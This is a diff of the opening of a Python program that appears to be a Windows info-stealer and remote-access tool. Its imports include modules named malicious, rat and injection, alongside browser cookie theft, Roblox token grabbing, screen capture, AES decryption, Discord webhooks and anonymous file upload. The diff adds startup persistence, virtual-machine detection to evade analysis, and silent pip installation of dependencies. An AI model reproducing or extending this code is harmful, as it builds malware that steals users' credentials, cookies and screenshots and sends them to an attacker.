@@ -1,32 +1,30 @@
-import sys
-
 import _webhook
 import discordc
 import informations
 import malicious
 import rat
-from config import Config
-
 import injection
-
+from startup import startup
+from config import Config
+from _roblox import RobloxX
+from anonFile import uploadToAnonfiles
+from vmdetect import vmdetection
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
-
 try:
     import getpass
     import os
-    import platform
     import random
     import re
     import shutil
     import socket
     import subprocess
     import threading
-    import time
+    import dhooks
+    import requests
     from base64 import b64decode
-    from ctypes import (POINTER, Structure, byref, c_buffer, c_char, cdll,
-                        windll, wintypes)
+    from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
     from json import dumps
     from json import loads
     from json import loads as json_loads
@@ -34,18 +32,11 @@ try:
     from sys import argv, executable
     from urllib.request import Request, urlopen
     from zipfile import ZipFile
-
-    import browser_cookie3
-    import dhooks
-    import psutil
-    import requests
-    from _roblox import RobloxX
-    from anonFile import uploadToAnonfiles
     from Crypto.Cipher import AES
     from PIL import ImageGrab
+    import browser_cookie3
 except Exception:
     import subprocess
-
     requirements = [
         "requests",
         "Pillow",
@@ -55,17 +46,19 @@ except Exception:
         "discord",
         "dhooks",
         "browser_cookie3",
+        "socketio",
     ]
-    # the [0:-3] removes the leading " &&"
     command = " ".join([
         f"python -m pip install {requirement} &&"
         for requirement in requirements
     ])[0:-3]
     subprocess.run(command, shell=True)
-
+import platform
 if platform.system() != "Windows":
     exit()
 
+startup()
+vmdetection()
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
